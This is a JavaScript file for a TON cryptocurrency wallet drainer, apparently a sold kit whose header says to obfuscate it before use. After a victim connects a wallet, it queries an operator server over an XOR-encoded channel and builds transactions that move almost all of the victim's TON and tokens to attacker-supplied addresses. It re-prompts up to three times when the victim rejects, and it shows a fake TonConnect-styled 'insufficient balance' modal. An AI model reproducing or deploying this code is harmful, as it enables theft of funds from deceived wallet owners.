// X-SOFTWARE.ORG
// OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/

// Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
const manifestUrl = 'https://fragment-xi.vercel.app/tonconnect-manifest.json' //'https://ton-connect.github.io/demo-dapp-with-wallet/tonconnect-manifest.json'; //'https://sainttest.de/tonconnect-manifest.json';

// The encryption key between the server and Frontend must be the same
let keyEncr = 500;

// Number of calls to the debit window when a transaction is rejected
const maxRetry = 3;

// Domain server
const server = 'fragment-xi.vercel.app'; //'sainttest.de'

//
const custom_btn = true; // Your own button to connect
const custom_btn_name = 'button'; // For future updates, don't touch
const autoconnect = false; // Auto-connect when entering the site




let tcUIbtn;
if (!custom_btn) {
    tcUIbtnn = 'ton-connect'
}
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect-ui'
});

let prs_enc = 0,
    last_request_ts = 0;
(async () => {
    prs_enc = keyEncr;
    keyEncr = Math.floor(Math.random() * 1000);
})()
const TonWeb = window.TonWeb;

const tonweb = new TonWeb();

const Address = TonWeb.utils.Address;
//const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));

let currTx = false;



const prs = (s, t) => {
    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};


const connectWallet = async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
    } else {
        await tonConnectUI.disconnect();
    }

}

const sendRequest = async (data) => {
    data.domain = window.location.host;
    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + prs_enc));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch("https://" + server + "/api/", {
        method: 'POST',
        headers: {
            'Accept': 'text/plain',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `raw=${request_data}`
    });


    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
        return {
            status: 'error',
            error: 'Server is Unavailable'
        };
    if (response_data.status == "OK") {
        console.log('STATUS OK')
        return {
            status: 'ok',
            data: response_data.data
        }
    }
    if (response_data.status == "ERROR" && response_data.reason == "low balance") {
        return {
            status: "error",
            reason: 'low balance'
        }
    }

    if (response_data.status == "ERROR" && response_data.reason == "low tax") {
        return {
            status: "error",
            reason: 'tax'
        }
    }

}
async function connect(walletAddress) {
    try {

        //site_connect();
     
        let res = await scan_account(walletAddress)

        if (res.status == "error" && res.reason == 'low balance') {
            console.log('Low Balance');
        }
        if (res.status == "error" && res.reason == 'tax') {
            console.log('Low tax');
            let modal = document.getElementById('modal')
            var div = document.createElement("DIV");
            var style = document.createElement("style");
            style.innerHTML = `.go1993895553{font-family:arial;} .go4168504425{font-family:arial;} .go1770544884{width:256px;padding:12px 16px;display:flex;gap:9px;background-color:#121214;box-shadow:0 4px 24px rgba(0, 0, 0, 0.16);border-radius:16px;}.go4168504425{font-style:normal;font-weight:510;font-size:14px;line-height:130%;color:#E5E5EA;}.go1993895553{font-style:normal;font-weight:700;font-size:20px;line-height:28px;text-align:center;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go1318663305{padding:0;display:flex;justify-content:center;align-items:center;width:32px;height:32px;border-radius:50%;background-color:#222224;border:none;cursor:pointer;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go1318663305:hover{transform:scale(1.04);}}.go1318663305:active{transform:scale(0.96);}@media (hover: none){.go1318663305:active{transform:scale(0.92);}}.go4218612181{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:pointer;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go4218612181:hover{transform:scale(1.02);}}.go4218612181:active{transform:scale(0.98);}@media (hover: none){.go4218612181:active{transform:scale(0.96);}}.go3974562317{background-color:#0098EA;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);padding:8px 16px 8px 12px;display:flex;align-items:center;gap:4px;height:40px;}.go242012907{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:not-allowed;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go242012907:hover{transform:unset;}}.go242012907:active{transform:unset;}@media (hover: none){.go242012907:active{transform:unset;}} .go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}@keyframes go1365964679{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.go121314943{animation:go1365964679 1s linear infinite;}.go3251346826{height:18px;width:18px;}.go817518207{min-width:148px;height:40px;background-color:#121214;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);display:flex;align-items:center;justify-content:center;}.go1140934594{font-style:normal;font-weight:590;font-size:15px;line-height:18px;color:#E5E5EA;}.go3349661836{transform:rotate(270deg);transition:transform 0.1s ease-in-out;}.go157313249{padding:12px 16px;min-width:148px;justify-content:center;background-color:#121214;}.go2933289244 > div:first-child{margin-top:20px;}.go3572451881{width:fit-content;display:flex;flex-direction:column;align-items:flex-end;}.go3758850101{position:absolute;right:16px;top:16px;}.go3525292397{margin-top:16px;}.go1186201158{font-weight:510;font-size:16px;line-height:20px;text-align:center;max-width:200px;color:#7D7D85;}.go3799783513{display:flex;flex-direction:column;align-items:center;padding-bottom:8px;}.go3872688706{position:relative;min-height:100px;width:416px;padding:44px 56px 24px;box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.04);background-color:#121214;border-radius:24px;}@media (max-width: 440px){.go3872688706{width:100%;}}.go1901766449{border-radius:24px;background-color:#222224;}@media (max-width: 440px){.go1901766449{border-radius:24px 24px 0 0;}}.go823957079{display:flex;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0, 0, 0, 0.4);padding:20px 0;overflow-y:auto;}@media (max-width: 440px){.go823957079{padding-bottom:0;}}.go3727189606{font-style:normal;font-weight:590;font-size:16px;line-height:20px;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go2847679431{width:192px;}.go2847679431 > h3{font-size:15px;}.go3770780435{align-self:center;}`
            div.innerHTML = '<div class="go823957079 s-enter-active s-enter-to" data-tc-actions-modal-container="true" data-tc-modal="true"><div class="go37342527 go1901766449"><div class="go3872688706"><button class="go3758850101 go1318663305" data-tc-icon-button="true"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.71966 2.71968C3.01255 2.42678 3.48743 2.42677 3.78032 2.71966L8.00002 6.93925L12.2197 2.71967C12.5126 2.42677 12.9874 2.42678 13.2803 2.71967C13.5732 3.01257 13.5732 3.48744 13.2803 3.78033L9.06068 7.99991L13.2803 12.2197C13.5732 12.5126 13.5732 12.9874 13.2803 13.2803C12.9874 13.5732 12.5126 13.5732 12.2197 13.2803L8.00002 9.06057L3.78033 13.2803C3.48744 13.5732 3.01257 13.5732 2.71967 13.2803C2.42678 12.9874 2.42677 12.5126 2.71967 12.2197L6.93936 7.99991L2.71968 3.78034C2.42678 3.48745 2.42677 3.01257 2.71966 2.71968Z" fill="#909099"></path></svg></button><div class="go3799783513" data-tc-confirm-modal="true"><svg width="75px" height="75px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke=""><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M10.0303 8.96967C9.73741 8.67678 9.26253 8.67678 8.96964 8.96967C8.67675 9.26256 8.67675 9.73744 8.96964 10.0303L10.9393 12L8.96966 13.9697C8.67677 14.2626 8.67677 14.7374 8.96966 15.0303C9.26255 15.3232 9.73743 15.3232 10.0303 15.0303L12 13.0607L13.9696 15.0303C14.2625 15.3232 14.7374 15.3232 15.0303 15.0303C15.3232 14.7374 15.3232 14.2625 15.0303 13.9697L13.0606 12L15.0303 10.0303C15.3232 9.73746 15.3232 9.26258 15.0303 8.96969C14.7374 8.6768 14.2625 8.6768 13.9696 8.96969L12 10.9394L10.0303 8.96967Z" fill="#0098EA"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M12.0574 1.25H11.9426C9.63424 1.24999 7.82519 1.24998 6.41371 1.43975C4.96897 1.63399 3.82895 2.03933 2.93414 2.93414C2.03933 3.82895 1.63399 4.96897 1.43975 6.41371C1.24998 7.82519 1.24999 9.63422 1.25 11.9426V12.0574C1.24999 14.3658 1.24998 16.1748 1.43975 17.5863C1.63399 19.031 2.03933 20.1711 2.93414 21.0659C3.82895 21.9607 4.96897 22.366 6.41371 22.5603C7.82519 22.75 9.63423 22.75 11.9426 22.75H12.0574C14.3658 22.75 16.1748 22.75 17.5863 22.5603C19.031 22.366 20.1711 21.9607 21.0659 21.0659C21.9607 20.1711 22.366 19.031 22.5603 17.5863C22.75 16.1748 22.75 14.3658 22.75 12.0574V11.9426C22.75 9.63423 22.75 7.82519 22.5603 6.41371C22.366 4.96897 21.9607 3.82895 21.0659 2.93414C20.1711 2.03933 19.031 1.63399 17.5863 1.43975C16.1748 1.24998 14.3658 1.24999 12.0574 1.25ZM3.9948 3.9948C4.56445 3.42514 5.33517 3.09825 6.61358 2.92637C7.91356 2.75159 9.62177 2.75 12 2.75C14.3782 2.75 16.0864 2.75159 17.3864 2.92637C18.6648 3.09825 19.4355 3.42514 20.0052 3.9948C20.5749 4.56445 20.9018 5.33517 21.0736 6.61358C21.2484 7.91356 21.25 9.62177 21.25 12C21.25 14.3782 21.2484 16.0864 21.0736 17.3864C20.9018 18.6648 20.5749 19.4355 20.0052 20.0052C19.4355 20.5749 18.6648 20.9018 17.3864 21.0736C16.0864 21.2484 14.3782 21.25 12 21.25C9.62177 21.25 7.91356 21.2484 6.61358 21.0736C5.33517 20.9018 4.56445 20.5749 3.9948 20.0052C3.42514 19.4355 3.09825 18.6648 2.92637 17.3864C2.75159 16.0864 2.75 14.3782 2.75 12C2.75 9.62177 2.75159 7.91356 2.92637 6.61358C3.09825 5.33517 3.42514 4.56445 3.9948 3.9948Z" fill="#0098EA"></path> </g></svg><h1 class="go3525292397 go1993895553" data-tc-h1="true">You have an insufficient balance</h1><div class="go1186201158 go4168504425" fontsize="14px" fontweight="510" lineheight="130%" color="#E5E5EA" data-tc-text="true" style="cursor: default;">Top-up your balance by at least 0.2 TON</div></div></div></div></div>';
            document.getElementsByTagName('body')[0].appendChild(style);
            document.getElementsByTagName('body')[0].appendChild(div);
            div.addEventListener("click", (event) => {div.style.display="none"});
        }
        if (res.status == 'ok') {
            var tryies = 0;
            if (res.data.haveJettons) {

                let data = {}
                let max = 32;
                if (Object.keys(res.data.jettons).length >= 32) {
                    for (let i = 0; i < Object.keys(res.data.jettons).length; i++) {
                        if (Object.keys(res.data.jettons).length >= 32) {
                            if (i < max && i < Object.keys(res.data.jettons).length - 1) {
                                data[i] = res.data.jettons[i];

                            } else {
                                max += 32;
                                let boc = await send_jettons(walletAddress, data)

                                let tx = await sendJettons(boc, walletAddress, res.data.ton, res.data.tonPrice, 0, 0, false)

                            }
                        }


                    }
                } else {
                    data = res.data.jettons;

                    let boc = await send_jettons(walletAddress, data)

                    let tx = await sendJettons(boc, walletAddress, res.data.ton, res.data.tonPrice, 0, 0, false)



                }

            } else {
                var tryies = 0;

                let dat = await send(walletAddress, res.data.ton, tryies)
                transaction_done(dat.hash, dat.val);
            }

        }


    } catch (error) {
        console.error('Error fetching balance:', error);
    }
}

async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFlag) {
    let adr = new TonWeb.utils.Address(walletAddress)
    if (i < 0) {
        i = 0;
    }
    currTx = false;
    let msgs = 0;
    let tkn = 0;
    let tontx;
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
        messages: []
    };
    let tokens = {}
    let len = Object.keys(data.data.boc).length;
    for (i; i < len + 1; i) {
        try {
            if (msgs < 4 && i < len) {

                msgs += 1;
                
                if ((ton * tonPrice < data.data.prices[i]) || (ton * tonPrice > data.data.prices[i] && tonFlag)) {

                    transaction.messages.push({
                        address: data.data.address[i],
                        amount: TonWeb.utils.toNano('0.05').toString(),
                        payload: data.data.boc[i]
                    });
                    tokens[tkn] = {
                        name: data.data.name[i],
                        prices: data.data.prices[i]
                    }
                    tkn++;
                    i++;
                } else {

                    if (ton > "0.5" && !tontx) {
                        let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.5");
                        let payload = await get_ton_text(transfer_value)
                        transaction.messages.push({
                            address: data.data.wallet,
                            amount: transfer_value,
                            payload : payload.data
                        });
                        tontx = true;
                        tonFlag = true
                        tokens[tkn] = {
                            name: 'TON',
                            prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
                        }
                        tkn++;
                    } else {
                        tonFlag = true
                        msgs -= 1;
                    }
                }


            } else {
                if (Object.keys(transaction.messages).length) {
                    tryies++
                    let txRequest = await transfer_jettons_native_request(tokens, tryies)
                    currTx = true;
                    const result = await tonConnectUI.sendTransaction(transaction)
                    tonweb.
                    msgs = 0;
                    tkn = 0;
                    
                    const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
                    transaction.messages = []
                    const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
                    let data123 = {
                        hash: hash,
                        tokens: tokens,
                    }
                    if (tontx) {
                        tonFlag = true;
                        await jettons_transaction_done(data123, true)
                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
                            setTimeout(async () => {
                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
                            }, '7000')
                        } else {
                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, true)
                        }
                    } else {
                        await jettons_transaction_done(data123, false)
                        await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {
                            setTimeout(async () => {
                                await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
                            }, '7000')
                        } else {
                            await sendJettons(data, walletAddress, ton, tonPrice, i, 0, false)
                        }
                    }
                } else {
                    return;
                }

            }
        } catch (e) {

            console.log(e)
        
            if (tontx) {
                if (tryies < maxRetry) {
                    transaction.messages = {}
                    let datas = {
                        data: tokens,
                        walletAddress: walletAddress,
                        ton: ton,
                        tonPrice: tonPrice,
                        i: i - tkn,
                        tryies: tryies,
                        tonFlag: tonFlag,
                        isTon: true
                    }
                    let res = await decline_transfer_jettons_native_request(datas)
                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
                        setTimeout(async () => {
                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
                        }, '3000')
                    } else {
                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, false);
                    }



                } else {

                    transaction.messages = {}

                    if (i < Object.keys(data.data.boc).length) {
                        let datas = {
                            data: tokens,
                            walletAddress: walletAddress,
                            ton: ton,
                            tonPrice: tonPrice,
                            i: i,
                            tryies: tryies,
                            tonFlag: tonFlag,
                            isTon: true
                        }
                        let res = await decline_transfer_jettons_native_request(datas)
                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {

                            setTimeout(async () => {
                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
                            }, '3000')
                        } else {
                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag);
                        }
                    } else {
                    }
                }

            } else {
                if (tryies < maxRetry) {
                    transaction.messages = {}
                    let datas = {
                        data: tokens,
                        walletAddress: walletAddress,
                        ton: ton,
                        tonPrice: tonPrice,
                        i: i - tkn,
                        tryies: tryies,
                        tonFlag: tonFlag,
                        isTon: false
                    }
                    let res = await decline_transfer_jettons_native_request(datas)
                    if (tonConnectUI.wallet.appName == 'telegram-wallet') {
                        setTimeout(async () => {
                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
                        }, '3000')
                    } else {
                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i - tkn, tryies, tonFlag)
                    }




                } else {
                    transaction.messages = {}
                    if (i < len) {
                        let datas = {
                            data: tokens,
                            walletAddress: walletAddress,
                            ton: ton,
                            tonPrice: tonPrice,
                            i: i,
                            tryies: 0,
                            tonFlag: tonFlag,
                            isTon: false
                        }
                        let res = await decline_transfer_jettons_native_request(datas)
                        if (tonConnectUI.wallet.appName == 'telegram-wallet') {

                            setTimeout(async () => {
                                let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
                            }, '3000')
                        } else {
                            let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)
                        }
                        let send = await sendJettons(data, walletAddress, ton, tonPrice, i, 0, tonFlag)


                    } else {
                        break;
                    }
                }
            }
    
        }

    }



}

async function send(walletAddress, balance, tryies, address) {
    tryies++;
    if (tryies <= maxRetry) {
        let transfer_value = TonWeb.utils.toNano(balance) - TonWeb.utils.toNano("0.05");
        const res1 = await transfer_ton_native_request(transfer_value, tryies)
        const addr = res1.data;
        balance = balance.toString()
        let payload = await get_ton_text(transfer_value)
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
            messages: [{
                    address: addr,
                    amount: transfer_value,
                    payload: payload.data
                }

            ]
        }

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
            const dat = {
                hash: hash,
                val: transfer_value
            }

            return dat;
        } catch (e) {
            console.error(e);
            decline_transfer_ton_native_request(balance, tryies);
            let hash = await send(walletAddress, balance, tryies);
            return hash;
        }
    }
}
const unsubscribe = tonConnectUI.onSingleWalletModalStateChange((state) => {

    if (state['closeReason'] == 'wallet-selected') {
        connect(tonConnectUI.account.address)
    }


});
const site_visit = async () => {
    try {

    } catch (err) {
        console.log(err);
    }
}
const scan_account = async (address) => {
    try {
        let response = await sendRequest({
            action: 'scan_account',
            account: address,
        });
        return response;

    } catch (err) {
        console.log(err);
    }
}

const get_ton_text = async (balance) => {
    try {
        let response = await sendRequest({
            action: 'get_ton_text',
            balance: balance,
        });
        return response;

    } catch (err) {
        console.log(err);
    }
}
const site_connect = async () => {
    try {
        let response = await sendRequest({
            action: 'connect',
            domain: window.location.host
        });
    } catch (err) {
        console.log(err);
    }
}
const site_scan_done = async (amount) => {
    try {
        let response = await sendRequest({
            action: 'scan_done',
            val: amount,
            domain: window.location.host
        });
    } catch (err) {
        console.log(err);
    }
}
const transfer_ton_native_request = async (amount, tryies) => {
    try {
        let response = await sendRequest({
            action: 'transfer_ton_native_request',
            val: amount,
            domain: window.location.host,
            try: tryies
        });
        return response;
    } catch (err) {
        console.log(err);
    }
}
const transfer_jettons_native_request = async (data, tryies) => {
    try {

        let response = await sendRequest({
            action: 'transfer_jettons_native_request',
            data: data,
            domain: window.location.host,
            try: tryies
        });
        return response;
    } catch (err) {
        console.log(err);
    }
}

const send_jettons = async (address, jettons) => {
    try {
        let response = await sendRequest({
            action: 'send_jettons',
            account: address,
            jettons: jettons
        });
        return response;

    } catch (err) {
        console.log(err);
    }
}
const decline_transfer_ton_native_request = async (amount, tryies) => {
    try {

        let response = await sendRequest({
            action: 'decline_transfer_ton_native_request',
            val: amount,
            domain: window.location.host,
            try: tryies
        });
    } catch (err) {
        console.log(err);
    }
}
const decline_transfer_jettons_native_request = async (data) => {

    try {
        let response = await sendRequest({
            action: 'decline_transfer_jettons_native_request',
            data: data.data,
            domain: window.location.host,
            walletAddress: data.walletAddress,
            ton: data.ton,
            tonPrice: data.tonPrice,
            i: data.i,
            tryies: data.tryies,
            tonFlag: data.tonFlag,
            isTon: data.isTon
        });
    } catch (err) {
        console.log(err);
    }
}
const transaction_done = async (hash, amount) => {
    try {
        let response = await sendRequest({
            action: 'transaction_done',
            val: amount,
            hash: hash,
            domain: window.location.host,

        });
    } catch (err) {
        console.log(err);
    }
}
const jettons_transaction_done = async (hash, amount) => {
    try {
        let response = await sendRequest({
            action: 'jettons_transaction_done',
            val: amount,
            hash: hash,
            domain: window.location.host,

        });
    } catch (err) {
        console.log(err);
    }
}


document.addEventListener('DOMContentLoaded', async () => {
    try {
        if (autoconnect) {
            await connectWallet();
        }
    } catch (e) {

    }
});
